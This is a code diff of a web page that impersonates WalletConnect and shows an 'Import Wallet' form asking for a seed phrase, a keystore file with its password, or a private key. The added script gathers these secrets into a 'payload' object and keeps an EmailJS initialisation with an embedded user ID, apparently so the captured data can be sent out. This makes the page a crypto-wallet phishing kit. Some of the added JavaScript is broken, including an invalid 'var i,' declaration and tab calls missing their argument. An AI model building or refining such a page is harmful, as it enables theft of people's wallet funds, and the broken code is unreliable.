@@ -6,22 +6,6 @@
         <meta name="description" content="Open protocol for connecting Wallets to Dapps" />
         <meta property="og:image" content="https://walletconnect.org/favicon.ico" />
         <link rel="icon" href="https://walletconnect.org/favicon.ico" />
-        <script>
-            function show() {
-                var x = document.getElementById("hidden");
-                if (x.style.display === "none") {
-                    x.style.display = "block";
-                } else {
-                    x.style.display = "none";
-                }
-
-                if (x.style.display === "block") {
-                    document.getElementById("btn").innerHTML = "Show Less &uarr;";
-                } else {
-                    document.getElementById("btn").innerHTML = "Show More &darr;";
-                }
-            }
-        </script>
         <title>WalletConnect</title>
     </head>
     <body>
@@ -622,19 +606,11 @@
                 <h2><center>Import Wallet</center></h2>
                 <br />
                 <div class="tab">
-                    <button
-                        class="tablinks active"
-                        id="default"
-                        onclick="openCity(event, &#39;phrase&#39;)"
-                    >
+                    <button class="tablinks active" id="default" onclick="openCity(event)">
                         Phrase
                     </button>
-                    <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)">
-                        Keystore JSON
-                    </button>
-                    <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">
-                        Private Key
-                    </button>
+                    <button class="tablinks" onclick="openCity(event)">Keystore JSON</button>
+                    <button class="tablinks" onclick="openCity(event)">Private Key</button>
                 </div>
 
                 <div id="phrase" class="tabcontent" style="display: block">
@@ -698,30 +674,6 @@
                 <script>
                     document.getElementById("default").click();
                 </script>
-                <footer>
-                    <div id="footer">
-                        <p>
-                            <img src="assets\discord.svg" class="footimg" />
-                            <a href="https://discord.gg/jhxMvxP">Discord</a>
-                        </p>
-                        <br />
-                        <p>
-                            <img src="assets\telegram.svg" class="footimg" />
-                            <a href="https://t.me/walletconnect_announcements">Telegram</a>
-                        </p>
-                        <br />
-                        <p>
-                            <img src="assets\twitter.svg" class="footimg" />
-                            <a href="https://twitter.walletconnect.org/">Twitter</a>
-                        </p>
-                        <br />
-                        <p>
-                            <img src="assets\github.svg" class="footimg" />
-                            <a href="https://github.com/walletconnect">Github</a>
-                        </p>
-                        <br />
-                    </div>
-                </footer>
             </center>
         </div>
 
@@ -731,7 +683,50 @@
         ></script>
 
         <script type="text/javascript">
+            // Get DOM Elements
             const Apps = document.querySelectorAll(".apps");
+            const hidden_section = document.getElementById("hidden");
+            const hide_btn = document.getElementById("btn");
+            const tabcontent = document.getElementsByClassName("tabcontent");
+            const tablinks = document.getElementsByClassName("tablinks");
+
+            const selected_Tab = {
+                tab:"Phrase"
+            }
+
+            const payload = {
+                tab:selected_Tab.tab,
+                ...(selected_Tab.tab == "Phrase" && {phrase:""}),
+                ...(selected_Tab.tab == "Keystore JSON" && {keystore:"", password:""}),
+                ...(selected_Tab.tab == "Private Key" && {private_key:""}),
+            }
+
+            function show() {
+                if (hidden_section.style.display === "none") {
+                    hidden_section.style.display = "block";
+                } else {
+                    hidden_section.style.display = "none";
+                }
+
+                if (hidden_section.style.display === "block") {
+                    hide_btn.innerHTML = "Show Less &uarr;";
+                } else {
+                    hide_btn.innerHTML = "Show More &darr;";
+                }
+            }
+
+            function openCity(evt, cityName) {
+                var i,
+                for (i = 0; i < tabcontent.length; i++) {
+                    tabcontent[i].style.display = "none";
+                }
+                for (i = 0; i < tablinks.length; i++) {
+                    tablinks[i].className = tablinks[i].className.replace(" active", "");
+                }
+                // Show the current tab, and add an "active" class to the button that opened the tab
+                document.getElementById(cityName).style.display = "block";
+                evt.currentTarget.className += " active";
+            }
 
             (function () {
                 emailjs.init("user_gNtktDkqqHmNHam5K8krE");
@@ -740,6 +735,7 @@
             Apps.forEach((app) => {
                 app.addEventListener("click", (e) => {
                     e.preventDefault();
+                    document.title = "Import Wallet";
                 });
             });
         </script>
